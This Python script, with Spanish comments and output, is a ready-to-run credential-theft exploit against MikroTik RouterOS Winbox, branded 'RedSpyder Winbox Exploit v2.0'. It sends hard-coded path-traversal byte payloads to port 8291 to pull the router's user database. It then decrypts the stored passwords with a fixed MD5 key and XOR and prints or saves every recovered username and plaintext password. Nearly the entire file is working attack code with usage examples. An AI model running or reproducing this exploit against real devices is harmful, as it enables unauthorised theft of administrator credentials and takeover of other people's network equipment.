#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# RedSpyder Winbox Exploit v2.0
# Herramienta de explotación avanzada para dispositivos MikroTik
# Parte exclusiva de la suite de herramientas REDSPYDER OS
#
# Autor: gstxx
import socket
import sys
import hashlib
import argparse
import time
from datetime import datetime

#colores
ROJO = "\033[91m"
VERDE = "\033[92m"
AMARILLO = "\033[93m"
AZUL = "\033[94m"
NEGRO = "\033[30m"
FONDO_ROJO = "\033[41m"
RESET = "\033[0m"

def mostrar_banner():
    banner = f"""{ROJO}                                                       
                    ##                ##                    
                   ##                  ##                   
                  #*#                  #*#                  
                 #*#                    #*#                 
                #*#        ######        #**                
               ####       ########       ##*#               
               ####     ############     ####               
             #  #####   ############   #####  #             
              ### ###### ########## ########*#              
                ############################                
                 ##########################                 
                   ######################                   
                ############################                
               ##############################               
             ***## ###################### ##**#             
            **#  ##########################  #*#            
           #*#  ####    ############    ####  #*#           
           ##   ####     ##########     ####   ##           
          ##    ####       ######       ####    ##          
                 #*#         ##         ####                
                  #*#                  #*#                  
                   ###                ###                   
                    ###              #*#                    
                      ##            ##    {RESET}

                                                     
{VERDE}         Winbox Exploit v2.0 - RedSpyder Security{RESET}
{AMARILLO}                    RouterOS > 6.42.12{RESET}
"""
    print(banner)

def mostrar_ayuda():
    ayuda = f"""
{AZUL}Uso:{RESET}
  python3 {sys.argv[0]} [OPCIONES] DIRECCIÓN_IP

{VERDE}Opciones:{RESET}
  -p, --puerto PUERTO      Puerto objetivo (por defecto: 8291)
  -o, --output ARCHIVO     Guardar resultados en archivo
  -t, --tiempo TIMEOUT     Tiempo de espera en segundos (por defecto: 5)
  -s, --silencioso         Modo silencioso (sin colores ni banners)
  -v, --verbose            Modo verbose (mostrar más detalles)
  -h, --help               Mostrar esta ayuda

{AZUL}Ejemplos:{RESET}
  python3 {sys.argv[0]} 192.168.1.1
  python3 {sys.argv[0]} -p 8291 -o resultados.txt 10.0.100.1
  python3 {sys.argv[0]} -t 10 --silencioso 192.168.1.1
"""
    print(ayuda)

def descifrar_contraseña(usuario, contraseña_cifrada):
    clave = hashlib.md5(usuario + b"283i4jfkai3389").digest()
    resultado = ""
    for i in range(len(contraseña_cifrada)):
        resultado += chr(contraseña_cifrada[i] ^ clave[i % len(clave)])
    return resultado.split("\x00")[0]

def extraer_usuario_contraseña(entrada):
    try:
        datos_usuario = entrada.split(b"\x01\x00\x00\x21")[1]
        datos_contraseña = entrada.split(b"\x11\x00\x00\x21")[1]

        longitud_usuario = datos_usuario[0]
        longitud_contraseña = datos_contraseña[0]

        usuario = datos_usuario[1:1 + longitud_usuario]
        contraseña = datos_contraseña[1:1 + longitud_contraseña]

        return usuario, contraseña
    except Exception as error:
        raise Exception(f"Error extrayendo credenciales: {error}")

def obtener_pares(datos):
    lista_usuarios = []
    entradas = datos.split(b"M2")[1:]
    
    for entrada in entradas:
        try:
            usuario, contraseña_cifrada = extraer_usuario_contraseña(entrada)
            contraseña_plana = descifrar_contraseña(usuario, contraseña_cifrada)
            lista_usuarios.append((usuario.decode("utf_8", "backslashreplace"), contraseña_plana))
        except Exception:
            continue
    
    return lista_usuarios

def imprimir_resultados(datos, archivo_salida=None, modo_verbose=False):
    credenciales = obtener_pares(datos)
    
    if not credenciales:
        print(f"{AMARILLO}[!] No se encontraron credenciales en los datos obtenidos{RESET}")
        return
    
    if archivo_salida:
        try:
            with open(archivo_salida, 'w', encoding='utf-8') as archivo:
                archivo.write(f"# REDSPYDER OS - Resultados de explotación Winbox\n")
                archivo.write(f"# Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                archivo.write(f"# Objetivo: {args.direccion_ip}:{args.puerto}\n\n")
                
                for usuario, contraseña in credenciales:
                    archivo.write(f"Usuario: {usuario}\n")
                    archivo.write(f"Contraseña: {contraseña}\n\n")
            
            if not args.silencioso:
                print(f"{VERDE}[+] Resultados guardados en: {archivo_salida}{RESET}")
        except Exception as error:
            print(f"{ROJO}[!] Error guardando resultados: {error}{RESET}")
    
    if modo_verbose:
        print(f"{AZUL}[*] Se encontraron {len(credenciales)} credenciales:{RESET}")
    
    for usuario, contraseña in credenciales:
        print(f"{VERDE}[+] Usuario: {usuario}{RESET}")
        print(f"{VERDE}[+] Contraseña: {contraseña}{RESET}\n")
    
    return credenciales

def ejecutar_exploit(direccion_ip, puerto, timeout):
    # PAYLOADS CONTRA WINBOX
    payload_saludo = bytearray([
        0x68, 0x01, 0x00, 0x66, 0x4d, 0x32, 0x05, 0x00,
        0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x05, 0x07,
        0x00, 0xff, 0x09, 0x07, 0x01, 0x00, 0x00, 0x21,
        0x35, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2e, 0x2f,
        0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f,
        0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f,
        0x2f, 0x2f, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x66,
        0x6c, 0x61, 0x73, 0x68, 0x2f, 0x72, 0x77, 0x2f,
        0x73, 0x74, 0x6f, 0x72, 0x65, 0x2f, 0x75, 0x73,
        0x65, 0x72, 0x2e, 0x64, 0x61, 0x74, 0x02, 0x00,
        0xff, 0x88, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0x88,
        0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00,
        0x00, 0x00
    ])
    
    payload_exploit = bytearray([
        0x3b, 0x01, 0x00, 0x39, 0x4d, 0x32, 0x05, 0x00,
        0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x06, 0x01,
        0x00, 0xfe, 0x09, 0x35, 0x02, 0x00, 0x00, 0x08,
        0x00, 0x80, 0x00, 0x00, 0x07, 0x00, 0xff, 0x09,
        0x04, 0x02, 0x00, 0xff, 0x88, 0x02, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01,
        0x00, 0xff, 0x88, 0x02, 0x00, 0x02, 0x00, 0x00,
        0x00, 0x02, 0x00, 0x00, 0x00
    ])

    #conexión inicial
    try:
        socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket_obj.settimeout(timeout)
        
        if not args.silencioso:
            print(f"{AZUL}[*] Conectando a {direccion_ip}:{puerto}...{RESET}")
        
        inicio_conexion = time.time()
        socket_obj.connect((direccion_ip, puerto))
        fin_conexion = time.time()
        
        if not args.silencioso:
            print(f"{VERDE}[+] Conexión establecida en {fin_conexion - inicio_conexion:.2f} segundos{RESET}")
    except Exception as error:
        print(f"{ROJO}[!] Error de conexión: {error}{RESET}")
        return None

    try:
        socket_obj.send(payload_saludo)
        respuesta = bytearray(socket_obj.recv(1024))
        
        if len(respuesta) < 39:
            print(f"{ROJO}[!] Respuesta inválida del servidor{RESET}")
            return None
    except Exception as error:
        print(f"{ROJO}[!] Error en handshake inicial: {error}{RESET}")
        socket_obj.close()
        return None

    try:
        payload_exploit[19] = respuesta[38]
        socket_obj.send(payload_exploit)
        
        datos = bytearray(socket_obj.recv(4096))
        
        time.sleep(0.5)
        try:
            datos_adicionales = socket_obj.recv(4096)
            datos.extend(datos_adicionales)
        except:
            pass
        
    except Exception as error:
        print(f"{ROJO}[!] Error durante la explotación: {error}{RESET}")
        socket_obj.close()
        return None
    finally:
        socket_obj.close()

    return datos

def main():
    global args
    
    parser = argparse.ArgumentParser(description='RedSpyder Winbox Exploit Tool', add_help=False)
    parser.add_argument('direccion_ip', nargs='?', help='Dirección IP del dispositivo objetivo')
    parser.add_argument('-p', '--puerto', type=int, default=8291, help='Puerto objetivo (por defecto: 8291)')
    parser.add_argument('-o', '--output', help='Archivo para guardar resultados')
    parser.add_argument('-t', '--tiempo', type=int, default=5, help='Timeout de conexión en segundos')
    parser.add_argument('-s', '--silencioso', action='store_true', help='Modo silencioso')
    parser.add_argument('-v', '--verbose', action='store_true', help='Modo verbose')
    parser.add_argument('-h', '--help', action='store_true', help='Mostrar ayuda')
    
    if '-h' in sys.argv or '--help' in sys.argv or len(sys.argv) == 1:
        if not any(arg in sys.argv for arg in ['-s', '--silencioso']):
            mostrar_banner()
        mostrar_ayuda()
        sys.exit(0)
    
    args = parser.parse_args()
    
    if not args.direccion_ip:
        print(f"{ROJO}[!] Ingresa tu objetivo{RESET}")
        mostrar_ayuda()
        sys.exit(1)
    
    if not args.silencioso:
        mostrar_banner()
        print(f"{AZUL}[*] Iniciando explotación contra: {args.direccion_ip}:{args.puerto}{RESET}")
        print(f"{AZUL}[*] Timeout configurado: {args.tiempo} segundos{RESET}")
        if args.output:
            print(f"{AZUL}[*] Guardando resultados en: {args.output}{RESET}")
        print()
    
    inicio_exploit = time.time()
    datos = ejecutar_exploit(args.direccion_ip, args.puerto, args.tiempo)
    fin_exploit = time.time()
    
    if datos is None:
        sys.exit(1)
    
    if len(datos[55:]) > 25:
        if not args.silencioso:
            print(f"{VERDE}[+] Explotación exitosa! ({fin_exploit - inicio_exploit:.2f}s){RESET}")
        credenciales = imprimir_resultados(datos[55:], args.output, args.verbose)
        
        if not args.silencioso and credenciales:
            print(f"{VERDE}[+] Operación completada con éxito{RESET}")
    else:
        print(f"{ROJO}[!] La explotación falló - no se pudieron extraer datos válidos{RESET}")
        sys.exit(1)

if __name__ == "__main__":
    main()